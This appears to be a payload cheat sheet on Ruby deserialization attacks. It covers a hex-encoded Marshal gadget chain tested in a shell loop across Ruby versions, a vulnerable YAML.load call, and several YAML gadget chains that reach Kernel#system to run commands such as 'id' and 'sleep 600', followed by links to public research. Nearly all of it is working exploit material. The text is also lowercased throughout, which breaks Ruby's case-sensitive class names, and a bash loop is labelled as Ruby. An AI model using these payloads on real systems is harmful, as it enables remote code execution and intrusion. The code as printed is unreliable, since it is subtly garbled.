# ruby deserialization

> ruby deserialization is the process of converting serialized data back into ruby objects, often using formats like yaml, marshal, or json. ruby's marshal module, for instance, is commonly used for this, as it can serialize and deserialize complex ruby objects.


## summary

* [marshal deserialization](#marshal-deserialization)
* [yaml deserialization](#yaml-deserialization)
* [references](#references)


## marshal deserialization

script to generate and verify the deserialization gadget chain against ruby 2.0 through to 2.5

```ruby
for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack("h*")) rescue nil'; done
```


## yaml deserialization

vulnerable code

```ruby
require "yaml"
yaml.load(file.read("p.yml"))
```

universal gadget for ruby <= 2.7.2:

```yaml
--- !ruby/object:gem::requirement
requirements:
  !ruby/object:gem::dependencylist
  specs:
  - !ruby/object:gem::source::specificfile
    spec: &1 !ruby/object:gem::stubspecification
      loaded_from: "|id 1>&2"
  - !ruby/object:gem::source::specificfile
      spec:
```

universal gadget for ruby 2.x - 3.x.

```yaml
---
- !ruby/object:gem::installer
    i: x
- !ruby/object:gem::specfetcher
    i: y
- !ruby/object:gem::requirement
  requirements:
    !ruby/object:gem::package::tarreader
    io: &1 !ruby/object:net::bufferedio
      io: &1 !ruby/object:gem::package::tarreader::entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:net::writeadapter
         socket: &1 !ruby/object:gem::requestset
             sets: !ruby/object:net::writeadapter
                 socket: !ruby/module 'kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

```yaml
 ---
 - !ruby/object:gem::installer
     i: x
 - !ruby/object:gem::specfetcher
     i: y
 - !ruby/object:gem::requirement
   requirements:
     !ruby/object:gem::package::tarreader
     io: &1 !ruby/object:net::bufferedio
       io: &1 !ruby/object:gem::package::tarreader::entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:net::writeadapter
          socket: &1 !ruby/object:gem::requestset
              sets: !ruby/object:net::writeadapter
                  socket: !ruby/module 'kernel'
                  method_id: :system
              git_set: sleep 600
          method_id: :resolve 
```


## references

- [ruby 2.x universal rce deserialization gadget chain - luke jahnke - november 8, 2018](https://www.elttam.com.au/blog/ruby-deserialization/)
- [universal rce with ruby yaml.load - etienne stalmans (@_staaldraad) - march 2, 2019](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/)
- [ruby 2.x universal rce deserialization gadget chain - pentesterlab - 2024](https://pentesterlab.com/exercises/ruby_ugadget/course)
- [universal rce with ruby yaml.load (versions > 2.7) - etienne stalmans (@_staaldraad) - january 9, 2021](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/)
- [blind remote code execution through yaml deserialization - colin mcqueen - june 9, 2021](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)